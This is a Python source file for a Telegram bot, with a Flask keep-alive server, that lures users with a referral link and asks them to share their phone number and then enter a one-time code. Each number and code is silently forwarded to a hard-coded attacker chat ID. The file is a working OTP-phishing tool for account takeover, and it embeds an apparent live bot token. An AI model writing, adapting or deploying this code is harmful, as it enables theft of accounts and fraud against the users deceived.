from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from flask import Flask
from threading import Thread

# Dictionary to track user OTP status
user_otp_status = {}

# Create a Flask app for keep-alive
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run():
    app.run(host='0.0.0.0', port=8080)

# Start command handler
def start(update: Update, context: CallbackContext):
    user = update.message.from_user
    chat_id = update.message.chat_id
    
    # Generate a referral link for the user
    referral_link = f"https://t.me/{context.bot.username}?start={user.id}"
    update.message.reply_text(f"Hello {user.first_name}! Here is your referral link: {referral_link}")

    # Asking for phone number
    button = KeyboardButton('Share your phone number', request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    update.message.reply_text("Please share your phone number to proceed.", reply_markup=reply_markup)

# Function to handle contact sharing
def contact_handler(update: Update, context: CallbackContext):
    contact = update.message.contact
    phone_number = contact.phone_number
    user_id = contact.user_id
    
    # Save the user's phone number in the user_otp_status dictionary
    user_otp_status[user_id] = {'phone_number': phone_number, 'otp_received': False}
    
    # Send the phone number to the admin (your telegram user ID)
    admin_chat_id = '5197417413'
    context.bot.send_message(chat_id=admin_chat_id, text=f"User ID: {user_id} shared their phone number: {phone_number}")
    
    # Confirm the number is received
    update.message.reply_text("Thanks for sharing your phone number!")
    
    # Ask the user to enter the OTP
    update.message.reply_text("Please enter the OTP.")

# Function to handle OTP input
def otp_handler(update: Update, context: CallbackContext):
    user = update.message.from_user
    user_id = user.id
    otp = update.message.text
    
    # Check if the user has shared their phone number before
    if user_id in user_otp_status and not user_otp_status[user_id]['otp_received']:
        user_otp_status[user_id]['otp_received'] = True
        
        # Send the OTP to the admin
        admin_chat_id = '5197417413'
        context.bot.send_message(chat_id=admin_chat_id, text=f"User ID: {user_id} entered OTP: {otp}")
        
        # Send a confirmation message to the user
        update.message.reply_text("Thanks. Pending your account.")
    else:
        # If the user hasn't shared their phone number or has already entered OTP
        update.message.reply_text("Please share your phone number first or you have already entered the OTP.")

def main():
    # Your bot token from BotFather
    TOKEN = '7489726317:AAHnzamto7-RB5hL3ec7UC7BGFaAqm7W2Nk'
    
    updater = Updater(TOKEN, use_context=True)
    
    dp = updater.dispatcher
    
    # Handler for /start command
    dp.add_handler(CommandHandler('start', start))
    
    # Handler for receiving contact (phone number)
    dp.add_handler(MessageHandler(Filters.contact, contact_handler))
    
    # Handler for receiving OTP (assuming OTP is sent as a text message)
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, otp_handler))
    
    # Start the Flask server in a separate thread
    Thread(target=run).start()
    
    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
